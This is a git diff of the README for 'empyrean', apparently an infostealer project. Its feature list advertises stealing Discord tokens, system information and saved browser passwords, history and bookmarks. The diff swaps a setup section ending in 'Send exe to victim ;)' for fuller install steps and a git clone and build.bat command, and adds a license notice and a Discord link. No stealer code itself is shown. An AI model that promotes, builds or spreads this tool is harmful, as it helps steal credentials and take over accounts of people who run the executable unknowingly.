@@ -9,7 +9,7 @@
     <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 </div>
 
-#### Features
+## Features
 - 🟩 Discord tokens + In depth information
 - 🟩 System information
 - 🟩 Browser data from Google Chrome, Microsoft Edge, and Brave Browser (passwords, history, bookmarks)
@@ -21,12 +21,35 @@
 
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
-#### Setup
-1. Download and extract the [source code](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
-2. If you have never installed python before run `install_python.bat`
-3. Run the builder by double clicking the `build.bat` file
-4. Follow instructions in builder and your exe will be in the same directory
-5. Send exe to victim ;)
+## Install
+<br>
+<details>
+    <summary>Prerequisites</summary>
+    <ul>
+        <li><a href="https://www.python.org/downloads/windows/"><p>Python</p></a></li>
+        <li><a href="https://git-scm.com/download/win"><p>Git</p></a></li>
+    <ul>
+</details>
+<br>
+<details>
+    <summary>For dummies</summary>
+    <ol>
+        <li>Install the above prerequisites</li>
+        <li><a href="https://github.com/addi00000/empyrean/archive/refs/heads/main.zip">Download source code zip</a></li>
+        <li>Extract zip</li>
+        <li>Run <code>install_python.bat</code></li>
+        <li>Run the builder by double clicking the <code>build.bat</code> file</li>
+        <li>Follow instructions in builder and your exe will be in the same directory</li>
+    </ol>
+</details>
+<br>
+
+```bash
+git clone https://github.com/addi00000/empyrean.git
+cd empyrean
+./build.bat
+```
+
 
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
@@ -39,7 +62,12 @@
 
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
-#### Errors?
+## License
+
+<!-- mit  -->
+Empyrean is licensed under the <a href="https://mit-license.org/">MIT License</a>.
+
+## Errors?
 - Make an [issue](https://github.com/addi00000/empyrean/issues)
 - Join the [Discord](https://discord.gg/G52tYpJWnQ)
 
